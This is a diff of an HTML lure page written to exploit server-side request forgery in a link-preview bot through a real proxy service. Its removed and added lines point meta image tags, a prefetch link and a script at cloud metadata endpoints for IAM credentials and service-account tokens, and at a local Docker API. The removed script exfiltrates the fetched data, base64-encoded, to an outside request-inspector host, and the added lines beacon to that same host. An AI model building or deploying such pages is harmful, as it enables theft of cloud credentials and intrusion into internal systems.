@@ -2,29 +2,22 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Internal Data Check</title>
-    
-    <meta property="og:description" content="Check result">
-    
-    <link rel="prefetch" href="https://max.ru/proxy?url=http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/default">
+    <title>Checking System Status...</title>
 
-    <img src="https://max.ru/proxy?url=http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token?header=Metadata-Flavor:Google">
+    <meta property="og:image" content="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/BOT_INIT_SUCCESS">
+    
+    <meta property="og:image:secure_url" content="https://max.ru/proxy?url=http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/">
+    
+    <meta name="twitter:image" content="https://max.ru/proxy?url=http://127.0.0.1.nip.io:2375/v1.24/containers/json">
 
+    <link rel="icon" href="https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com/BOT_REACHED_ICON">
 </head>
 <body>
+    <h1>Diagnostic Page</h1>
     <script>
-        // Если бот всё же умеет в JS, этот код отправит нам точное время
+        // Резервный вариант, если ты все же нажмешь сама
         const inspector = "https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com";
-        const sensitiveTarget = "http://169.254.169.254.nip.io/latest/meta-data/";
-        
-        fetch(`https://max.ru/proxy?url=${encodeURIComponent(sensitiveTarget)}`)
-            .then(r => r.text())
-            .then(data => {
-                // Если мы получили данные, шлем их тебе в инспектор (BASE64)
-                fetch(`${inspector}/EXFILTRATED_DATA?d=${btoa(data.substring(0, 100))}`);
-            }).catch(e => {
-                fetch(`${inspector}/ERROR?e=blocked`);
-            });
+        fetch(inspector + "/USER_CLICKED_MANUALLY");
     </script>
 </body>
 </html>
